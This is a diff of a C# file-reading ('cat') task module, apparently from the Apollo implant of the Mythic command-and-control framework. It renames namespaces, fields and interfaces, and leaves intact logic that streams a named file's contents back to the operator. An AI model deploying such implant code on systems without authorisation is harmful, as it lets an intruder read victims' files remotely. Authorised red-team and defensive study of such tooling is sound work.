@@ -6,12 +6,12 @@
 
 #if CAT
 using System;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
-using PhantomInterop.Classes.Collections;
+using ApolloInterop.Classes.Collections;
 using System.IO;
 using TT = System.Threading.Tasks;
 namespace Tasks
@@ -25,9 +25,9 @@ namespace Tasks
             public string Path;
         }
 
-        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
+        private AutoResetEvent _complete = new AutoResetEvent(false);
         private AutoResetEvent _fileRead = new AutoResetEvent(false);
-        private bool _isFinished = false;
+        private bool _completed = false;
         private ThreadSafeList<string> _contents = new ThreadSafeList<string>();
         private Action _flushContents;
         private WaitHandle[] _timers;
@@ -39,13 +39,13 @@ namespace Tasks
         {
             _timers = new WaitHandle[]
             {
-                _taskComplete,
-                _stopToken.Token.WaitHandle
+                _complete,
+                _cancellationToken.Token.WaitHandle
             };
             _flushContents = new Action(() =>
             {
                 string output = "";
-                while(!_stopToken.IsCancellationRequested && !_isFinished)
+                while(!_cancellationToken.IsCancellationRequested && !_completed)
                 {
                     WaitHandle.WaitAny(_timers, 1000);
 
@@ -77,7 +77,7 @@ namespace Tasks
             {
                 _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
                 _bytesRemaining = fs.Length - fs.Position;
-                if (_bytesRemaining > 0 && !_stopToken.IsCancellationRequested)
+                if (_bytesRemaining > 0 && !_cancellationToken.IsCancellationRequested)
                 {
                     _buffer = _bytesRemaining > _chunkSize ? new byte[_chunkSize] : new byte[_bytesRemaining];
                     fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
@@ -97,7 +97,7 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp;
-            CatParameters parameters = _dataSerializer.Deserialize<CatParameters>(_data.Parameters);
+            CatParameters parameters = _jsonSerializer.Deserialize<CatParameters>(_data.Parameters);
             if (!File.Exists(parameters.Path))
             {
                 resp = CreateTaskResponse($"File {parameters.Path} does not exist.", true, "error");
@@ -105,10 +105,10 @@ namespace Tasks
             else
             {
                 
-                TT.Task.Factory.StartNew(_flushContents, _stopToken.Token);
+                TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
                 FileStream fs = null;
                 FileInfo finfo = new FileInfo(parameters.Path);
-                ICommandMessage[] artifacts = new ICommandMessage[]
+                IMythicMessage[] artifacts = new IMythicMessage[]
                 {
                     Artifact.FileOpen(finfo.FullName)
                 };
@@ -127,15 +127,15 @@ namespace Tasks
                         WaitHandle.WaitAny(new WaitHandle[]
                         {
                             _fileRead,
-                            _stopToken.Token.WaitHandle
+                            _cancellationToken.Token.WaitHandle
                         });
                     }
                     catch (OperationCanceledException)
                     {
                     }
 
-                    _isFinished = true;
-                    _taskComplete.Set();
+                    _completed = true;
+                    _complete.Set();
                     resp = CreateTaskResponse("", true, "completed", artifacts);
                 }
                 catch (UnauthorizedAccessException ex)
